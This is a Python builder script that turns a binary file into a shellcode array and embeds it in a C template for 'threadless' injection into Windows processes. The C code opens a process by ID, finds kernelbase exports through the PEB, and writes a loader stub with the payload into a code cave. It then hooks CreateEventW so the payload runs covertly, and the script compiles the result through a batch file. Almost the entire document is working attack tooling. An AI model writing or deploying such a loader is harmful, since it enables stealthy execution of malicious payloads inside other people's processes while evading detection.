import sys
import subprocess
import os
sln_file_path = 'threadless.sln'
restore_command = ['dotnet', 'restore', sln_file_path]
build_command = ['dotnet', 'build', sln_file_path]

def file_to_shellcode(input_file):
    try:
        # Read the binary file
        with open(input_file, 'rb') as file:
            binary_data = file.read()

        # Convert binary data to a list of hexadecimal bytes
        shellcode = [f"0x{byte:02X}" for byte in binary_data]

        return ', '.join(shellcode)
    except FileNotFoundError:
        return "File not found"
    except Exception as e:
        return str(e)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python hexshellcode.py <input_file>")
        sys.exit(1)

    input_file = sys.argv[1]
    shellcode = file_to_shellcode(input_file)
    if shellcode != "File not found":
        print("Shellcode:")
        print(shellcode)

        stub = """

#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <time.h>
#include "threadless.h"

#include "Structs.h"

#ifndef STRUCTS
#include <winternl.h>
#endif // !STRUCTS
#define _DBG

#ifdef _DBG
#define DEBUG_PRINT(x, ...) printf(x, ##__VA_ARGS__)
#define _INT getchar()
#else
#define DEBUG_PRINT(x, ...)
#define _INT
#endif

#define CODE_CAVE_RANGE 0x75000000
#define CONV(x) (UINT_PTR)x
// TODO: string hashing
#define TARGET_DLL L"kernelbase.dll"

// choosing a target function to patch
// api monitor is good help
// for most processes
//
#define TARGET_EXP_FUNC "CreateEventW"
// other choices
//
#define TARGET_EXP_FUNC "MapViewOfFileEx"

// https://learn.microsoft.com/en-us/windows/win32/api/ntdef/nf-ntdef-containing_record
#define CONTAINING_RECORD(address, type, field) \
    ((type *)((PCHAR)(address) - (ULONG_PTR)(&((type *)0)->field)))



// function helper that takes 2 strings
// convert them to lower case strings
// compare them, and return true if both are equal
// and false otherwise
BOOL IsStringEqual(IN LPCWSTR Str1, IN LPCWSTR Str2) {

    WCHAR	lStr1[MAX_PATH],
        lStr2[MAX_PATH];

    int		len1 = lstrlenW(Str1),
        len2 = lstrlenW(Str2);

    int		i = 0,
        j = 0;

    // checking - we dont want to overflow our buffers
    if (len1 >= MAX_PATH || len2 >= MAX_PATH)
        return FALSE;

    // converting Str1 to lower case string (lStr1)
    for (i = 0; i < len1; i++) {
        lStr1[i] = (WCHAR)tolower(Str1[i]);
    }
    lStr1[i++] = L'\\0'; // null terminating


    // converting Str2 to lower case string (lStr2)
    for (j = 0; j < len2; j++) {
        lStr2[j] = (WCHAR)tolower(Str2[j]);
    }
    lStr2[j++] = L'\\0'; // null terminating


    // comparing the lower-case strings
    if (lstrcmpiW(lStr1, lStr2) == 0)
        return TRUE;

    return FALSE;
}



// function that replaces GetModuleHandle
// it uses pointers to enumerate in the dlls
HMODULE AltModuleHandle(IN LPCWSTR szModuleName) {

    // getting peb
#ifdef _WIN64 // if compiling as x64
    PPEB					pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32 // if compiling as x32
    PPEB					pPeb = (PEB*)(__readfsdword(0x30));
#endif

    // geting Ldr
    PPEB_LDR_DATA			pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
    // getting the first element in the linked list (contains information about the first module)
    PLDR_DATA_TABLE_ENTRY	pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

    while (pDte) {

        // if not null
        if (pDte->FullDllName.Length != NULL) {

            // check if both equal
            if (IsStringEqual(pDte->FullDllName.Buffer, szModuleName)) {
                wprintf(L"[+] Found Dll \\"%s\\" \\n", pDte->FullDllName.Buffer);
#ifdef STRUCTS
                return (HMODULE)(pDte->InInitializationOrderLinks.Flink);
#else
                return (HMODULE)pDte->Reserved2[0];
#endif // STRUCTS

            }

            // wprintf(L"[i] \\"%s\\" \\n", pDte->FullDllName.Buffer);
        }
        else {
            break;
        }

        // next element in the linked list
        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);

    }

    return NULL;
}

FARPROC AltProcAddress(IN HMODULE hModule, IN LPCSTR lpApiName) {

    // we do this to avoid casting at each time we use 'hModule'
    PBYTE pBase = (PBYTE)hModule;

    // getting the dos header and doing a signature check
    PIMAGE_DOS_HEADER	pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    // getting the nt headers and doing a signature check
    PIMAGE_NT_HEADERS	pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    // getting the optional header
    IMAGE_OPTIONAL_HEADER	ImgOptHdr = pImgNtHdrs->OptionalHeader;

    // we can get the optional header like this as well
    // PIMAGE_OPTIONAL_HEADER	pImgOptHdr	= (PIMAGE_OPTIONAL_HEADER)((ULONG_PTR)pImgNtHdrs + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));

    // getting the image export table
    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    // getting the function's names array pointer
    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
    // getting the function's addresses array pointer
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
    // getting the function's ordinal array pointer
    PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);


    // looping through all the exported functions
    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
        // getting the name of the function
        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);

        // getting the address of the function through its ordinal
        PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

        // searching for the function specified
        if (strcmp(lpApiName, pFunctionName) == 0) {
            // printf("[ %0.4d ] FOUND API -\\t NAME: %s -\\t ADDRESS: 0x%p  -\\t ORDINAL: %d\\n", i, pFunctionName, pFunctionAddress, FunctionOrdinalArray[i]);
            return pFunctionAddress;
        }


    }


    return NULL;
}


unsigned char ldrStub[] = {
    0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
    0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00,
    0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF,
    0xE0, 0x90,
    //
    // append shellcode
    // calcx64
    //
    "REPLACE_ME_SHELLCODE"
};

unsigned char callStub[] = {
    0xE8, 0x44, 0x33, 0x22, 0x11
};

//
// Allocate buffer in the empty space, make sure the buffer address is
// close to the 'call near, relative' instruction (0xe8)
//
BOOL FindCodeCave(_In_ HANDLE hProc, _In_ PVOID pExpAddr, _In_ DWORD64 dwDllSpace, _In_ SIZE_T sShellcode, _Out_ PVOID* ppCodeCave)
{
    NTSTATUS status = 0x0;

    // make sure the code cave is within approximate 2GB range of target function
    for (*ppCodeCave = CONV(pExpAddr & 0xFFFFFFFFFFF0000) - CODE_CAVE_RANGE;
        *ppCodeCave < CONV(pExpAddr);
        CONV(*ppCodeCave) += 0x1000)
    {
        status = NtAllocateVirtualMemory(hProc, ppCodeCave, 0, &sShellcode, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        if (0x0 != status) continue;
        break;
    }

    if (NULL == *ppCodeCave)
        return FALSE;

    return TRUE;
}

//
// Generate complete loader stub with original 8 bytes from target function
//
VOID GenerateLoaderStub(_In_ PVOID originalBytes, _In_ SIZE_T sOriginalBytes)
{
    *(UINT_PTR*)(ldrStub + 18) = *(PUCHAR*)originalBytes;
#ifdef _DBG
    DEBUG_PRINT("\\n\\n\\tGenerated loader stub:\\n\\t");
    for (DWORD i = 0; i < sizeof(ldrStub); i++)
        DEBUG_PRINT("%.2X ", ldrStub[i]);
    DEBUG_PRINT("\\n\\n");
#endif
}

//
// Write call stub into target function
//
BOOL PatchExportedFunc(_In_ HANDLE hProc, _In_ PVOID pExpAddr, _In_ PVOID pRelLdrAddr, _In_ SIZE_T sCallStub)
{
    *(UINT_PTR*)(callStub + 1) = CONV(pRelLdrAddr) & 0xFFFFFFFF;

#ifdef _DBG

    for (DWORD i = 0; i < sizeof(callStub); i++)
    {
        DEBUG_PRINT("%.2X ", callStub[i]);
    }
    DEBUG_PRINT("\\n");
#endif


    DWORD dwBytesWritten = 0x0;
    NTSTATUS status = 0x0;

    if (0x0 != (status = NtWriteVirtualMemory(hProc, pExpAddr, callStub, sCallStub, &dwBytesWritten)) || dwBytesWritten != sCallStub)
    {

        return FALSE;
    }


    _INT;
}

//
// wait for execution, compare the beginning of target function with original bytes
// if the bytes have been restored, cleanup and quit
//
VOID WaitForExecution(_In_ HANDLE hProc, _In_ PVOID pExpAddr, _In_ SIZE_T sBufSize, _In_ PVOID pOriginalInstBytesBuf)
{

    PVOID pCurrrenInstBuf = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBufSize);
    DWORD sBytesRead = 0x0;

    time_t startTime = time(NULL);
    int elapsed = 0x0;

    while (elapsed < 60)
    {
        if (!ReadProcessMemory(hProc, pExpAddr, pCurrrenInstBuf, sBufSize, &sBytesRead) || sBytesRead != sBufSize)
        {

            return FALSE;
        }

        if (0 == memcmp(pCurrrenInstBuf, pOriginalInstBytesBuf, sBufSize))
        {

            break;
        }

        Sleep(1000);
        elapsed = (int)(time(NULL) - startTime);
    }

    HeapFree(GetProcessHeap(), 0, pCurrrenInstBuf);
}

int main(int argc, char** argv)
{
    if (argc < 2)
    {
        printf("[-]Usage: %s <Process ID> ...\\n", argv[0]);
        return -1;
    }

    HANDLE hProc = INVALID_HANDLE_VALUE;
    PVOID pCodeCaveAddr = NULL;
    PVOID pExpAddr = NULL;
    PVOID pRelLdrAddr = NULL;
    PVOID pOriginalInstBytesBuf = NULL;
    DWORD dwProcId = 0x0;
    DWORD dwBytesWritten = 0x0;
    DWORD dwOldProtect = 0x0;
    DWORD64 dwDllSpace = 0x0;
    SIZE_T sLdrStub = sizeof(ldrStub);
    SIZE_T sCallStub = sizeof(callStub);
    SIZE_T sBufSize = 0x8;
    SIZE_T sBytesRead = 0x0;
    NTSTATUS status = 0x0;







    dwProcId = atoi(argv[1]);
    hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcId);
    if (INVALID_HANDLE_VALUE == hProc)
    {
        DEBUG_PRINT("[-]Failed to open process with error: 0x%.8x", GetLastError());
        goto _exit;
    }

    DEBUG_PRINT("\\n[*]Payload memory info: \\n");

    // TODO: hash
    pExpAddr = AltProcAddress(AltModuleHandle(TARGET_DLL), TARGET_EXP_FUNC);


    // allocate buffer to hold our loaderStub + shellcode
    if (!FindCodeCave(hProc, pExpAddr, dwDllSpace, sLdrStub, &pCodeCaveAddr))
    {

        goto _exit;
    }


    //
    // read 8 bytes of original instructions from target function
    // will be used to restore the function after calling shellcode
    //
    pOriginalInstBytesBuf = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBufSize);
    if (NULL == pOriginalInstBytesBuf)
    {
        DEBUG_PRINT("[-]Failed to allocate buffer with error: 0x%.8x\\n", GetLastError());
        goto _exit;
    }

    if (!ReadProcessMemory(hProc, pExpAddr, pOriginalInstBytesBuf, sBufSize, &sBytesRead) || sBytesRead != sBufSize)
    {
        DEBUG_PRINT("[-]Failed to read process memory with error: 0x%.8x\\n", GetLastError());
        goto _exit;
    }

#ifdef _DBG
    DEBUG_PRINT("\\n\\t%d bytes read from target function '%s':\\n\\t", sBytesRead, TARGET_EXP_FUNC);
    for (WORD i = 0; i < sBytesRead; i++)
        DEBUG_PRINT("0x%.2X ", ((PUCHAR)pOriginalInstBytesBuf)[i]);
#endif

    // insert original bytes into loader stub
    GenerateLoaderStub(pOriginalInstBytesBuf, sBufSize);

    //
    // this is to address the problem that on certain versions (including windows 11 22H2)
    // allocating the code cave as PAGE_READWRITE is not enough, have to explicitly invoke
    // protect API to mark it as PAGE_READWRITE for the write process to succeed
    //
    PVOID pTmpCodeCaveAddr = pCodeCaveAddr;
    if (0x0 != (status = NtProtectVirtualMemory(hProc, &pTmpCodeCaveAddr, &sCallStub, PAGE_READWRITE, &dwOldProtect)))
    {
        DEBUG_PRINT("[-]Failed to change memory protection for code cave before writing with error: 0x%.8x\\n", GetLastError());
        goto _exit;
    }

    // TODO: syscall
    // write loader stub
    if (0x0 != (status = NtWriteVirtualMemory(hProc, pCodeCaveAddr, ldrStub, sLdrStub, &dwBytesWritten)) || dwBytesWritten != sLdrStub)
    {
        DEBUG_PRINT("[-]Failed to write loader stub with error: 0x%.8x\\n", GetLastError());
        goto _exit;
    }

    if (0x0 != (status = NtProtectVirtualMemory(hProc, &pCodeCaveAddr, &sLdrStub, PAGE_EXECUTE_READ, &dwOldProtect)))
        DEBUG_PRINT("[-]Failed to change memory protection for code cave with error: 0x%.8x\\n", GetLastError());




    // calculate relative address of loader stub, accounting the 5-byte call opcode
    pRelLdrAddr = (PVOID)(CONV(pCodeCaveAddr) - (CONV(pExpAddr) + 5));




    // NtProtectVirtualMemory has the side-effect to zero out the last 2 bytes of target address
    PVOID pTmpExpAddr = pExpAddr;
    if (0x0 != (status = NtProtectVirtualMemory(hProc, &pTmpExpAddr, &sCallStub, PAGE_EXECUTE_READWRITE, &dwOldProtect)))
    {
        DEBUG_PRINT("[-]Failed to change memory protection for target function with error: 0x%.8x\\n", GetLastError());
        goto _exit;
    }

    // write relative call opcodes to taget function
    PatchExportedFunc(hProc, pExpAddr, pRelLdrAddr, sizeof(callStub));

    WaitForExecution(hProc, pExpAddr, sBufSize, pOriginalInstBytesBuf);

    // flip memory protection back
    if (0x0 != (status = NtProtectVirtualMemory(hProc, &pExpAddr, &sCallStub, dwOldProtect, &dwOldProtect)))


_exit:
    if (NULL != hProc)
        CloseHandle(hProc);
    if (NULL != pOriginalInstBytesBuf)
        HeapFree(GetProcessHeap(), 0, pOriginalInstBytesBuf);



    return 0;
}

"""
# Replace the placeholder with actual shellcode
final_stub = stub.replace('"REPLACE_ME_SHELLCODE"', shellcode)
file_path = 'threadless/main.c'

# Change directory to 'threadless'
os.chdir('threadless')

# Write the modified stub to a file in the 'threadless' directory
with open('main.c', 'w') as file:
    file.write(final_stub)

# Confirm current working directory after change
print("Current Working Directory after change:", os.getcwd())

# Run the batch file in the current directory (threadless)
batch_file_path = 'test.bat'
subprocess.run(batch_file_path, shell=True)
